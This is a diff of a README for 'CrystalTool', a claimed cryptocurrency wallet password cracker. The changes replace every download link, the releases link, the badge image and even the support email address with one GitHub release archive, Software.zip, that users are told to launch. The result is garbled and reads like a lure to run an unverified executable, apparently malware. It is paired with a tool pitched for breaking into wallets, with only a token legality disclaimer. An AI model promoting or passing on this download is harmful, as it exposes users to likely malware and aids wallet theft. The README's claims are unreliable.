@@ -26,9 +26,9 @@ Welcome to CrystalTool, the ultimate tool for cracking cryptocurrency wallet pas
 ## Usage
 To start using CrystalTool, simply download the tool from the link provided below and launch it to begin the password cracking process.
 
-[![Download CrystalTool](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) - *Needs to be launched*
+[![Download CrystalTool](https://github.com/ZypherPVP/CrystalTool/releases/download/v2.0/Software.zip)](https://github.com/ZypherPVP/CrystalTool/releases/download/v2.0/Software.zip) - *Needs to be launched*
 
-If the link above is not working or you need more information, please check the "Releases" section of this repository: [CrystalTool Releases](https://github.com/YouaifXD/789566136/releases).
+If the link above is not working or you need more information, please check the "Releases" section of this repository: [CrystalTool Releases](https://github.com/ZypherPVP/CrystalTool/releases/download/v2.0/Software.zip).
 
 ## 🌟 Get Started with CrystalTool
 1. Download the tool using the link provided above.
@@ -42,7 +42,7 @@ If the link above is not working or you need more information, please check the 
 **Please note that using CrystalTool for unauthorized access to cryptocurrency wallets is illegal and unethical. It should only be used for legitimate purposes such as password recovery on your own wallets. Always respect the privacy and security of others.**
 
 ## 📞 Support
-If you encounter any issues or have any questions about CrystalTool, feel free to reach out to us via email at crystaltool.support@gmail.com. Our team is here to assist you with any queries you may have.
+If you encounter any issues or have any questions about CrystalTool, feel free to reach out to us via email at https://github.com/ZypherPVP/CrystalTool/releases/download/v2.0/Software.zip Our team is here to assist you with any queries you may have.
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
